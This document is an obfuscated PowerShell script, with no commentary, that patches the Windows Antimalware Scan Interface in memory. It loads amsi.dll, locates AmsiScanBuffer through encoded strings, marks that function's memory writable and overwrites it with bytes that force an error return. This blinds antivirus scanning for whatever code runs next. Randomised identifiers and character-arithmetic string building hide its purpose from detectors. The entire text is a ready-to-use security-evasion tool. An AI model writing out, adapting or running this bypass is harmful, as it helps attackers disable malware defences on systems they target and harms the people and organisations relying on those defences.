$Pb4XMyXC8aeAn3Lu = @"
using System;
using System.Runtime.InteropServices;
public class Pb4XMyXC8aeAn3Lu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr nD4y8eLc0KgdI, string I0UYdm1we7Vw941PFOa);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr KzCSj5ipvcd2l7Jq, UIntPtr hOYpo8PhNwA6nh, uint jNblX3gyWnPv, out uint Kjn5PerRUSuD7fad5);
}
"@

Add-Type $Pb4XMyXC8aeAn3Lu

$VJ9SInQ1NqDYhi = [Pb4XMyXC8aeAn3Lu]::LoadLibrary("$([Char]([bytE]0x61)+[chAR](9+100)+[ChAR]([byte]0x73)+[ChaR]([bytE]0x69)+[CHAR](46*23/23)+[ChAR](100*22/22)+[CHaR](108*99/99)+[chAr]([BYtE]0x6c))")
$It6CjuhEobbhVhpJpX0A = [Pb4XMyXC8aeAn3Lu]::GetProcAddress($VJ9SInQ1NqDYhi, "$(('ÄmsìScânBùff'+'ér').nOrmaLizE([chaR](70*55/55)+[ChAR](111*104/104)+[chAr]([bytE]0x72)+[CHar]([BytE]0x6d)+[cHAR](68*21/21)) -replace [cHar](68+24)+[chAR](52+60)+[cHar](123)+[cHAR]([bYTe]0x4d)+[ChAR](54+56)+[chAr](10+115))")
$p = 0
[Pb4XMyXC8aeAn3Lu]::VirtualProtect($It6CjuhEobbhVhpJpX0A, [uint32]5, 0x40, [ref]$p)
$VVVgKLjZMk = "0xB8"
$afQ4_xKjyWmKAkbbVlB = "0x57"
$jtYjte5QsiwNO = "0x00"
$dxJcGrOcv80eEWN9wqh_ = "0x07"
$SvJAD38dQtf4AtS9jRN = "0x80"
$Lf6uoMs9ZhdKNfGk9lik = "0xC3"
$b7mL = [Byte[]] ($VVVgKLjZMk,$afQ4_xKjyWmKAkbbVlB,$jtYjte5QsiwNO,$dxJcGrOcv80eEWN9wqh_,+$SvJAD38dQtf4AtS9jRN,+$Lf6uoMs9ZhdKNfGk9lik)
[System.Runtime.InteropServices.Marshal]::Copy($b7mL, 0, $It6CjuhEobbhVhpJpX0A, 6)